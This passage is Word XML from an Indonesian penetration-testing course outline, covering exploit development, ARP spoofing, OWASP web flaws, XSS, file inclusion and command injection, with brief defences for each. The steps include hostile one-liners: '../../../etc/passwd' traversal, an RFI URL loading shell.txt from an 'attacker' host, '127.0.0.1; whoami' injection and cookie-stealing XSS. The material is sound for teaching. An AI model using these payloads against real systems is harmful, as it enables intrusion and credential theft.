      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 ASLR: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>POSISI LEMARI diacak.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 DEP: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>LARANGAN nyalain api.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Fuzzer Python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Cari offset dengan pattern</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Kontrol EIP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Generate shellcode msfvenom</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>Bypass ASLR/DEP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Aktifkan ASLR, DEP, CFG</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 9: Linux Server Advanced</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>ARP spoofing, DoS, exploit dev Linux.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 ARP Spoofing: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>MAMPERIN POS SATPAM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 DoS: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>NELPON TERUS-TERUSAN.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>ARP Spoof + tcpdump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>DoS: ab -n 10000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Buffer overflow Linux GDB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Bypass DEP ROP manual</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Static ARP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Rate limiting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 10: Wazuh SIEM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Instalasi Wazuh: manager, agent, dashboard.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 SIEM: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>PUSAT CCTV + SATPAM PINTAR.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Install Wazuh script</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Buka dashboard</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Pasang agent di client</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Tes deteksi SSH brute force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Backup konfigurasi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 11: Web Information Gathering</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>OSINT, scanning, bypass Cloudflare, subdomain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 OSINT: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>JADI DETEKTIF - data publik.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Cloudflare: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>PAGAR RUMAH. Cari IP asli.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>WHOIS target.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Google Dorking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>subfinder subdomain</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>wafw00f deteksi WAF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>gobuster dir</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 6: </w:t>
      </w:r>
      <w:r>
        <w:t>robots.txt, backup/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Blokir akses langsung IP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 12: OWASP Top 10 Bagian 1 (A1-A5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Broken Access, Crypto, Injection, Misconfig.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Access: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Resepsionis kasih kunci kamar salah.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Injection: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>WARUNG: nasi goreng, kasih semua duit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Tes akses /admin, ganti user_id</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Cek password hash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Tes Injection: OR 1=1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Cek directory listing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>RBAC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>bcrypt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Prepared statement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 13: OWASP Top 10 Bagian 2 (A6-A10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Outdated, Auth, Logging, SSRF, Google Dorking.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Outdated: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>MOBIL TAHUN 80an.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 SSRF: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>SURATIN MENTARI ambil data internal.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Google Dork: inurl:php?id=</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Cari backup: ext:bak</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Tes SSRF: 127.0.0.1:3306</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Cek IDOR, logging, session</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Aktifkan logging</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Blokir IP internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 14: XSS Cross-Site Scripting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Reflected, Stored, cookie stealing, bypass.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 XSS: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>CATATAN di papan pengumuman semua orang baca.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Stored: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>NULIS DI BUKU TAMU.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>&lt;script&gt;alert(1)&lt;/script&gt; di parameter</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>&lt;script&gt; di komentar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Cookie stealer: Image src</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Bypass WAF: img onerror</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>xsstrike scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>htmlspecialchars</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HttpOnly cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CSP header</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 15: File Inclusion: LFI &amp; RFI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Local/Remote File Inclusion, log poisoning.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 LFI: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>MINTA FILE ke pustakawan terlalu nurut.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 RFI: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>MAKANAN CATERING dari luar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>?file=../../../etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>php://filter base64</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>LFI to RCE via log poisoning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>RFI: ?page=http://attacker/shell.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Matikan allow_url_include</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Whitelist file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 16: IDOR, Upload &amp; Command Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>IDOR, webshell, Command Injection, CSRF.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 IDOR: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>KUNCI KAMAR ORANG LAIN.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 File Upload: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>TITIP PAKET tanpa diperiksa.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 CSRF: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>NIPU SATPAM kartu palsu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Ganti user_id parameter</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Upload shell.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>127.0.0.1; whoami</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>CSRF HTML auto-submit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
